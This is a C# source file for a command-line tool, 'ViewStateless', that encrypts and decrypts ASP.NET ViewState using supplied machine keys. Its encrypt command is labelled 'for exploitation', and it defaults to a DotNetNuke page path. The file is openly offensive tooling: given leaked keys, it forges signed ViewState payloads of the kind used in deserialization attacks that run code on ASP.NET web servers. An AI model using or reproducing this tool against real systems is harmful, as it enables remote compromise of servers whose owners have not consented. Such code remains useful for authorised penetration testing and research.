using System;
using System.CommandLine;
using System.CommandLine.Invocation;
using System.IO;
using System.Threading.Tasks;

namespace ViewStateless {
    class Program {
        static int Main(string[] args) {

            Option[] opts = {
                new Option("--ek", "encryption key") {
                    Argument = new Argument<string>()
                },
                new Option("--vk", "validation key") {
                    Argument = new Argument<string>()
                },
                new Option("--msg", "base64 encoded message to encrypt/decrypt") {
                    Argument = new Argument<string>()
                },
                new Option("--alg", "encryption algorithm") {
                    Argument = new Argument<string>(defaultValue: () => "3DES")
                },
                new Option("--hash", "hashing algorithm") {
                    Argument = new Argument<string>(defaultValue: () => "SHA1")
                },
                new Option("--url", "public URL") {
                    Argument = new Argument<string>(defaultValue: () => "/dnn/Default")
                },
            };

            var rootCmd = new RootCommand();

            var encryptCmd = new Command("encrypt");
            encryptCmd.Description = "encrypt a ViewState (for exploitation)";
            Array.ForEach(opts, opt => encryptCmd.AddOption(opt));
            rootCmd.AddCommand(encryptCmd);

            var decryptCmd = new Command("decrypt");
            decryptCmd.Description = "decrypt a ViewState (verify keys / algs)";
            Array.ForEach(opts, opt => decryptCmd.AddOption(opt));
            rootCmd.AddCommand(decryptCmd);

            ICryptoService GetCrypto(string ek, string vk, string alg, string hash, string url) {
                string type = url.TrimStart('/').Replace('/', '_').ToUpper() + "_ASPX";
                string dir = "/" + url.TrimStart('/').Split('/')[0].ToUpper();

                Purpose purpose = new Purpose("WebForms.HiddenFieldPageStatePersister.ClientState",
                    new string[]{
                        "TemplateSourceDirectory: " + dir,
                        "Type: " + type,
                    }
                );

                IMasterKeyProvider mkp = new FakeMasterKeyProvider(ek, vk);
                ICryptoAlgorithmFactory caf = new FakeCryptoAlgorithmFactory(alg, hash);

                CryptographicKey dek = purpose.GetDerivedEncryptionKey(mkp, SP800_108.DeriveKey);
                CryptographicKey dvk = purpose.GetDerivedValidationKey(mkp, SP800_108.DeriveKey);
                return new NetFXCryptoService(caf, dek, dvk);
            }

            void Encrypt(string ek, string vk, string msg, string alg, string hash, string url) {
                var cs = GetCrypto(ek, vk, alg, hash, url);
                byte[] payload = System.Convert.FromBase64String(msg);
                byte[] data = cs.Protect(payload);
                Console.WriteLine(System.Convert.ToBase64String(data));
            }

            void Decrypt(string ek, string vk, string msg, string alg, string hash, string url) {
                var cs = GetCrypto(ek, vk, alg, hash, url);
                byte[] payload = System.Convert.FromBase64String(msg);
                byte[] data = cs.Unprotect(payload);
                Console.WriteLine(System.Text.Encoding.Default.GetString(data));
            }

            encryptCmd.Handler = CommandHandler.Create<string, string, string, string, string, string>(Encrypt);
            decryptCmd.Handler = CommandHandler.Create<string, string, string, string, string, string>(Decrypt);

            return rootCmd.InvokeAsync(args).Result;
        }
    }
}
